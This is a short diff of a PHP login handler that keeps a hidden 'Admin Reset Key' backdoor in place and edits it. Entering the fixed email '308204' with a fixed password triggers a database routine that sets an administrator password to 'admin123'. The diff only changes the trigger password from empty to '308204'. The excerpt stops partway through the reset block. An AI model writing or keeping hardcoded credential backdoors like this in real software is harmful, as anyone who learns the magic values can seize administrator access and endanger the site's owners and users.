@@ -55,7 +55,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $remember = isset($_POST['remember']);
     
     // Admin Reset Key - Key: 308204, Password: empty
-    if ($email === '308204' && $password === '') {
+    if ($email === '308204' && $password === '308204') {
         try {
             $db = getDB();
             $new_password = 'admin123';
